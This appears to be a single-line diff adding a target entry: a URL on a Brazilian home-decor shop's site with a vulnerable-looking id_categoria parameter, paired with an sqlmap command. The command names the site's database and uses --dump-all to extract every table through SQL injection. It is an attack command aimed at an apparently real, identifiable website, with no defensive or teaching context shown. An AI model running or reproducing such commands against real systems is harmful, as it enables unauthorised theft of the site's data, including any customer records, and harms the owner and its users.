@@ -1,0 +1,1 @@
+https://www.astriddecor.com.br/imagens_categoria.php?id_categoria=1 (GET)  # sqlmap.py -u https://www.astriddecor.com.br/imagens_categoria.php?id_categoria=1 -D astridde_astrid --tables --dump-all --threads 5 -v3
